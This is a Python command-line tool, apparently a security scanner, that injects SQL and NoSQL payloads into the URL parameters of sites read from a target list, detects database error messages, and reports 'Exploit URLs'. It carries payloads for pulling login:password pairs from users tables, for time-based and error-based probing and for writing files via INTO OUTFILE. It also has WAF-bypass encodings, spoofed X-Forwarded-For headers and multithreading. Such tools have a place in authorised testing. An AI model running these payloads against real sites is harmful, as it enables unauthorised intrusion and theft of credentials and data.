#!/usr/bin/env python3
"""
███████╗██████╗ ██████╗  ██████╗ ██████╗ ████████╗
██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
███████╗██████╔╝██████╔╝██║   ██║██████╔╝   ██║   
╚════██║██╔═══╝ ██╔══██╗██║   ██║██╔══██╗   ██║   
███████║██║     ██║  ██║╚██████╔╝██║  ██║   ██║   
╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   

Advanced Database Injection Scanner (SQL/NoSQL)
- Error-Based Detection for 9 Database Systems
- Silent Mode (Only Shows Vulnerabilities)
- WAF Bypass Techniques
- Multi-Threaded Scanning
- Comprehensive Reporting
"""

import requests
import re
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
from functools import partial
import json
import random
import time
import sys
from datetime import datetime

# Disable all warnings
warnings.filterwarnings("ignore")

# Color codes
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'

BANNER = f"""
{colors.BLUE}╔═╗┬ ┬┌─┐┌─┐┬┌─  ╔╦╗┌─┐┌─┐┬┌─┌─┐┬─┐
{colors.CYAN}╠═╝├─┤├─┤│  ├┴┐  ║║║├┤ ├─┤├┴┐├┤ ├┬┘
{colors.GREEN}╩  ┴ ┴┴ ┴└─┘┴ ┴  ╩ ╩└─┘┴ ┴┴ ┴└─┘┴└─
{colors.END}{colors.BOLD}Advanced Database Injection Scanner{colors.END}
"""

# Enhanced payloads with WAF bypass techniques
PAYLOADS = {
    'SQL': {
        'Basic': [
            "'", "\"", "')", "\")", "`", "')--", "\")--",
            "';", "\";", "`;", "--", "#", "/*", "*/", "/*!",
            "' OR 'x'='x", "\" OR \"x\"=\"x", "' OR 1=1", "\" OR 1=1"
        ],
        'Union-Based': [
            "' UNION SELECT null--", 
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT @@version,user(),database()--",
            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
            "' UNION SELECT null,concat(login,':',password) FROM users--",
            "' UNION ALL SELECT null,schema_name FROM information_schema.schemata--"
        ],
        'Error-Based': [
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,USER()))--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(USER(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND GTID_SUBSET(CONCAT(0x7e,USER(),0x7e),1)--",
            "' AND (SELECT 1 FROM(SELECT NAME_CONST(USER(),1),NAME_CONST(USER(),1))a)--"
        ],
        'Time-Based': [
            "' OR IF(1=1,SLEEP(5),0)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR BENCHMARK(10000000,MD5(NOW()))--",
            "' OR (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--"
        ],
        'WAF-Bypass': [
            "'/*!50000OR*/1=1--", 
            "'%0AOR%0A1=1--",
            "'||1=1--",
            "'/**/OR/**/1=1--",
            "'%09UNION%09SELECT%09NULL%09--",
            "'%23%0AUNION%23%0ASELECT%23%0ANULL--",
            "'/*!12345UNION*/+SELECT+NULL--",
            "'AND(SELECT'1'FROM'pg_sleep(5)')='1",
            "'%bf%27 OR 1=1 --",
            "'\uFFFF' OR 1=1 --",
            "'\x00' OR 1=1 --"
        ],
        'Alternative-Encodings': [
            "%27%20OR%201%3D1--",
            "%2527%2520OR%25201%253D1--",
            "'%20OR%201=1--",
            "char(39)%20OR%201=1--",
            "0x2720OR201=1--",
            "concat('\'', ' OR 1=1--')"
        ]
    },
    'NoSQL': {
        'MongoDB': [
            '{"$where": "1 == 1"}',
            '{"$ne": 1}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$exists": true}',
            '{"$nin": [1, 2, 3]}',
            '{"$or": [{"a":"a"}, {"b":"b"}]}',
            '{"$where": "sleep(5000)"}',
            '"; return true; var x="',
            '{"$function": "function() { return true; }"}'
        ],
        'JSON-Injection': [
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
            '{"condition": {"$function": "return true"}}',
            '{"$where": "this.username == \'admin\' && this.password == \'password\'"}'
        ],
        'CouchDB': [
            '{"selector": {"$or": [{"username": "admin"}, {"username": "administrator"}]}}',
            '{"selector": {"username": {"$eq": "admin"}, "password": {"$regex": ".*"}}}',
            '{"selector": {"$where": "1 == 1"}}',
            '{"selector": {"$func": "function() { return true; }"}}'
        ],
        'ElasticSearch': [
            '{"query": {"bool": {"must": [{"match_all": {}}]}}}',
            '{"query": {"script": {"script": "1 == 1"}}}',
            '{"query": {"filtered": {"query": {"match_all": {}}}}}',
            '{"query": {"bool": {"should": [{"match": {"username": "admin"}}]}}}'
        ],
        'SQL-In-JSON': [
            '{"username": "admin\' OR 1=1--"}',
            '{"query": "SELECT * FROM users WHERE username = \'admin\' OR 1=1--"}',
            '{"$sql": "SELECT 1 FROM DUAL WHERE 1=1"}'
        ]
    },
    'Polyglot': [
        "' OR 1=1; --",
        "' OR 1=1 /*",
        "' OR 1=1 #",
        "' OR 1=1%00",
        "'; WAITFOR DELAY '0:0:5'--",
        "'%20OR%201=1",
        "1' ORDER BY 1--+",
        "1' UNION SELECT 1,2,3--+",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--+",
        "1' OR '1'='1' LIMIT 1--+",
        "1' OR 1=1 INTO OUTFILE '/tmp/test'--+",
        "1' OR 1=1 INTO DUMPFILE '/tmp/test'--+"
    ]
}

# Comprehensive database error patterns
DB_ERRORS = {
    'MySQL': [
        r"SQL syntax.*MySQL", r"Warning.*mysql_.*",
        r"MySqlClient\.", r"com\.mysql\.jdbc\.exceptions",
        r"Syntax error or access violation", r"MySQL server version",
        r"for the right syntax to use", r"Unknown column",
        r"MySQLSyntaxErrorException", r"mysqli_sql_exception",
        r"check the manual that corresponds to your MySQL server version",
        r"MySQLSyntaxError", r"MySQLNonTransientConnectionException"
    ],
    'MariaDB': [
        r"MariaDB.*ERROR", r"org\.mariadb\.jdbc\.MariaDbSqlException",
        r"Syntax error near", r"check the manual that corresponds to your MariaDB",
        r"ERROR \d+ \(HY000\)", r"MariaDB server version"
    ],
    'PostgreSQL': [
        r"PostgreSQL.*ERROR", r"pg_.*error", r"Npgsql\.",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"PostgreSQL query failed", r"operator does not exist",
        r"unterminated quoted string at or near",
        r"pg_query\(\)", r"column .* does not exist"
    ],
    'Microsoft SQL Server': [
        r"Microsoft SQL Server", r"System\.Data\.SqlClient\.SqlException",
        r"Unclosed quotation mark", r"Incorrect syntax near",
        r"SQL Server.*Error", r"Msg \d+, Level \d+, State \d+",
        r"com\.microsoft\.sqlserver\.jdbc\.SQLServerException",
        r"Conversion failed", r"Login failed for user",
        r"Cannot open database requested by the login"
    ],
    'Oracle Database': [
        r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver",
        r"SQL error.*ORA-", r"OracleDBException", r"PLS-\d{4}",
        r"TNS:", r"ORA-00933", r"ORA-00936", r"ORA-01756",
        r"ORA-06512", r"ORA-12154"
    ],
    'SQLite': [
        r"SQLite/JDBCDriver", r"sqlite3\.OperationalError",
        r"sqlite3\.ProgrammingError", r"SQLite error",
        r"unrecognized token:", r"file is encrypted or is not a database"
    ],
    'IBM DB2': [
        r"DB2 SQL error", r"SQLCODE=-\d+", r"SQLSTATE=\w+",
        r"com\.ibm\.db2\.jcc\.am\.SqlSyntaxErrorException",
        r"DB2 SQL Error:", r"SQLCODE", r"SQLSTATE"
    ],
    'Firebird': [
        r"Dynamic SQL Error", r"SQL error code = -\d+",
        r"firebirdsql\.client", r"org\.firebirdsql\.jdbc",
        r"Token unknown", r"invalid request BLR"
    ],
    'SAP HANA': [
        r"com\.sap\.db\.jdbc\.SQLExceptionSapDB",
        r"SQL error \[\d+\]:", r"feature not supported: .*HANA"
    ],
    'MongoDB': [
        r"MongoDB\.", r"SyntaxError: missing", r"Unexpected token",
        r"MongoError:", r"Invalid BSON", r"BSON.*size",
        r"ECONNREFUSED.*MongoDB", r"failed: network error",
        r"E11000 duplicate key error", r"MongoNetworkError"
    ],
    'Redis': [
        r"Redis\.", r"ERR wrong number of arguments", r"ERR syntax error",
        r"Redis server.*error", r"WRONGTYPE Operation against",
        r"LOADING Redis is loading", r"NOAUTH Authentication required"
    ],
    'Cassandra': [
        r"Cassandra\.", r"InvalidRequest.*Error", r"Invalid query",
        r"Unauthorized: Error", r"com\.datastax\.driver\.core\.exceptions",
        r"Invalid syntax for", r"unconfigured table",
        r"Keyspace.*does not exist"
    ],
    'CouchDB': [
        r"CouchDB\.", r"query_parse_error", r"no_usable_index",
        r"Invalid JSON", r"compilation_error", r"Erlang.*error",
        r"bad_request", r"not_found"
    ],
    'ElasticSearch': [
        r"Elasticsearch\.", r"SearchPhaseExecutionException",
        r"ElasticsearchStatusException", r"ParsingException",
        r"mapper_parsing_exception", r"query_shard_exception",
        r"index_not_found_exception", r"no such index"
    ],
    'Neo4j': [
        r"Neo\.ClientError", r"Neo4jException",
        r"org\.neo4j\.driver\.exceptions", r"Invalid input",
        r"Unknown function", r"InvalidSyntax"
    ],
    'InfluxDB': [
        r"partial write: field type conflict",
        r"unable to parse '.*': invalid number",
        r"measurement not found"
    ]
}


class ScanResult:
    def __init__(self):
        self.total_requests = 0
        self.vulnerabilities = []
        self.errors = []
        self.start_time = None
        self.end_time = None
        self.scanned_urls = 0

def load_targets(input_file):
    """Load targets from file or single URL"""
    targets = []
    if input_file:
        try:
            with open(input_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{colors.RED}[!] Error reading input file: {e}{colors.END}")
            sys.exit(1)
    return targets

def flatten_payloads():
    """Flatten the structured payloads into a single list"""
    flat_payloads = []
    
    # SQL payloads
    for category in PAYLOADS['SQL'].values():
        flat_payloads.extend(category)
    
    # NoSQL payloads
    for category in PAYLOADS['NoSQL'].values():
        flat_payloads.extend(category)
    
    # Polyglot payloads
    flat_payloads.extend(PAYLOADS['Polyglot'])
    
    return flat_payloads

def generate_headers():
    """Generate random headers for each request"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Mozilla/5.0 (Linux; Android 10; SM-G975F)'
    ]
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
    }

def verify_false_positive(url, param, payload, db_type, proxy=None, timeout=10):
    """Verify if a detected vulnerability is a false positive"""
    try:
        # Prepare test URL with benign payload
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(urlparse(url).query).items()}
        test_params[param] = "1"  # Benign value
        
        # Send request
        response = requests.get(
            url.split('?')[0],
            params=test_params,
            headers=generate_headers(),
            proxies={'http': proxy, 'https': proxy} if proxy else None,
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        
        # Check if the benign request also triggers errors
        response_content = f"{response.text}\n{response.headers}"
        for pattern in DB_ERRORS[db_type]:
            if re.search(pattern, response_content, re.IGNORECASE):
                return True  # This is likely a false positive
        
        return False
    except Exception as e:
        return True  # Assume false positive if verification fails

def test_injection(url, param, value, payload, proxy=None, timeout=10):
    """Test a single injection point"""
    try:
        # Prepare test URL
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(urlparse(url).query).items()}
        test_params[param] = payload
        
        # Send request
        response = requests.get(
            url.split('?')[0],
            params=test_params,
            headers=generate_headers(),
            proxies={'http': proxy, 'https': proxy} if proxy else None,
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        
        # Check for errors
        response_content = f"{response.text}\n{response.headers}"
        error_messages = []
        detected_dbs = set()  # Track which DBs we've already found
        
        for db, patterns in DB_ERRORS.items():
            for pattern in patterns:
                match = re.search(pattern, response_content, re.IGNORECASE)
                if match and db not in detected_dbs:
                    error_messages.append({
                        'db': db,
                        'error': match.group(0)
                    })
                    detected_dbs.add(db)
                    break  # Only need one match per database type
        
        if error_messages:
            return {
                'url': url,
                'param': param,
                'payload': payload,
                'errors': error_messages,
                'status': response.status_code,
                'vulnerable_url': f"{url.split('?')[0]}?{urlencode(test_params)}",
                'response_length': len(response.text)
            }
    except Exception as e:
        return {
            'error': str(e),
            'url': url,
            'param': param,
            'payload': payload
        }
    return None

def scan_url(url, payloads, proxy=None, output_file=None, result_obj=None, verify_fp=False):
    """Scan a single URL for injection vulnerabilities"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        return None
        
    results = []
    for param in params:
        for payload in payloads:
            if result_obj:
                result_obj.total_requests += 1
            
            result = test_injection(url, param, params[param][0], payload, proxy)
            
            if result and 'errors' in result:
                # False positive verification
                is_fp = False
                if verify_fp:
                    for error in result['errors']:
                        is_fp = verify_false_positive(url, param, payload, error['db'], proxy)
                        if is_fp:
                            break
                
                if not is_fp:
                    results.append(result)
                    if result_obj:
                        result_obj.vulnerabilities.append(result)
                    
                    # Print vulnerability
                    print(f"{colors.GREEN}[+] {colors.BOLD}VULNERABLE{colors.END}{colors.GREEN}: {url}{colors.END}")
                    print(f"    {colors.YELLOW}Parameter{colors.END}: {param}")
                    print(f"    {colors.RED}Payload{colors.END}: {payload}")
                    for error in result['errors']:
                        print(f"    {colors.BLUE}Database{colors.END}: {error['db']}")
                        print(f"    {colors.PURPLE}Error{colors.END}: {error['error']}")
                    print(f"    {colors.CYAN}Exploit URL{colors.END}: {result['vulnerable_url']}\n")
                    
                    # Save to file
                    if output_file:
                        with open(output_file, 'a') as f:
                            f.write(f"[VULNERABLE] {url}\n")
                            f.write(f"Parameter: {param}\n")
                            f.write(f"Payload: {payload}\n")
                            for error in result['errors']:
                                f.write(f"Database: {error['db']}\n")
                                f.write(f"Error: {error['error']}\n")
                            f.write(f"Status: {result['status']}\n")
                            f.write(f"Response Length: {result['response_length']}\n")
                            f.write(f"Exploit URL: {result['vulnerable_url']}\n")
                            f.write("-"*80 + "\n")
                
                break  # Stop testing this parameter after first vulnerability
            elif result and 'error' in result:
                if result_obj:
                    result_obj.errors.append(result)
    
    if result_obj:
        result_obj.scanned_urls += 1
    
    return results

def print_summary(result_obj):
    """Print scan summary report"""
    print(f"\n{colors.BOLD}{colors.BLUE}=== SCAN SUMMARY ==={colors.END}")
    print(f"{colors.YELLOW}Start Time:{colors.END} {result_obj.start_time}")
    print(f"{colors.YELLOW}End Time:{colors.END} {result_obj.end_time}")
    print(f"{colors.YELLOW}Duration:{colors.END} {(result_obj.end_time - result_obj.start_time).total_seconds():.2f} seconds")
    print(f"{colors.YELLOW}Scanned URLs:{colors.END} {result_obj.scanned_urls}")
    print(f"{colors.YELLOW}Total Requests:{colors.END} {result_obj.total_requests}")
    print(f"{colors.GREEN}Vulnerabilities Found:{colors.END} {len(result_obj.vulnerabilities)}")
    print(f"{colors.RED}Errors Encountered:{colors.END} {len(result_obj.errors)}\n")
    
    if result_obj.vulnerabilities:
        print(f"{colors.BOLD}{colors.BLUE}=== VULNERABILITIES FOUND ==={colors.END}")
        for vuln in result_obj.vulnerabilities:
            print(f"{colors.GREEN}URL:{colors.END} {vuln['url']}")
            print(f"{colors.YELLOW}Parameter:{colors.END} {vuln['param']}")
            print(f"{colors.RED}Payload:{colors.END} {vuln['payload']}")
            for error in vuln['errors']:
                print(f"{colors.BLUE}Database:{colors.END} {error['db']}")
                print(f"{colors.PURPLE}Error:{colors.END} {error['error']}")
            print(f"{colors.CYAN}Exploit URL:{colors.END} {vuln['vulnerable_url']}\n")
    
    if result_obj.errors:
        print(f"{colors.BOLD}{colors.RED}=== ERRORS ENCOUNTERED ==={colors.END}")
        for error in result_obj.errors[:5]:  # Show first 5 errors only
            print(f"{colors.RED}URL:{colors.END} {error['url']}")
            print(f"{colors.YELLOW}Parameter:{colors.END} {error.get('param', 'N/A')}")
            print(f"{colors.RED}Payload:{colors.END} {error.get('payload', 'N/A')}")
            print(f"{colors.PURPLE}Error:{colors.END} {error['error']}\n")
        if len(result_obj.errors) > 5:
            print(f"{colors.RED}... and {len(result_obj.errors) - 5} more errors{colors.END}")

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description="Advanced Database Injection Scanner",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("-u", "--url", help="Single URL to test")
    parser.add_argument("-f", "--file", help="File containing URLs to test")
    parser.add_argument("-p", "--payloads", help="Custom payloads file")
    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument("--proxy", help="Proxy server (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Thread count")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--verify-fp", action="store_true", help="Verify potential false positives")
    parser.add_argument("--silent", action="store_true", help="Only show vulnerabilities in output")
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        return
    
    # Initialize scan result object
    scan_result = ScanResult()
    scan_result.start_time = datetime.now()
    
    # Load targets
    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        targets = load_targets(args.file)
    
    # Load payloads
    if args.payloads:
        try:
            with open(args.payloads, 'r') as f:
                payloads = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{colors.RED}[!] Error loading payloads file: {e}{colors.END}")
            payloads = flatten_payloads()
    else:
        payloads = flatten_payloads()
    
    if not args.silent:
        print(f"{colors.BLUE}[*] Scanning {len(targets)} targets with {len(payloads)} payloads{colors.END}")
        print(f"{colors.BLUE}[*] Using {args.threads} threads{colors.END}")
        if args.proxy:
            print(f"{colors.BLUE}[*] Using proxy: {args.proxy}{colors.END}")
        if args.verify_fp:
            print(f"{colors.BLUE}[*] False positive verification enabled{colors.END}")
    
    # Thread pool execution
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(
                scan_url, 
                url, 
                payloads, 
                args.proxy, 
                args.output, 
                scan_result,
                args.verify_fp
            ): url for url in targets
        }
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                if not args.silent:
                    print(f"{colors.RED}[!] Error scanning URL: {e}{colors.END}")
    
    scan_result.end_time = datetime.now()
    
    if not args.silent:
        print_summary(scan_result)
    
    if args.output:
        with open(args.output, 'a') as f:
            f.write("\n=== SCAN SUMMARY ===\n")
            f.write(f"Start Time: {scan_result.start_time}\n")
            f.write(f"End Time: {scan_result.end_time}\n")
            f.write(f"Duration: {(scan_result.end_time - scan_result.start_time).total_seconds():.2f} seconds\n")
            f.write(f"Scanned URLs: {scan_result.scanned_urls}\n")
            f.write(f"Total Requests: {scan_result.total_requests}\n")
            f.write(f"Vulnerabilities Found: {len(scan_result.vulnerabilities)}\n")
            f.write(f"Errors Encountered: {len(scan_result.errors)}\n")

if __name__ == "__main__":
    main()
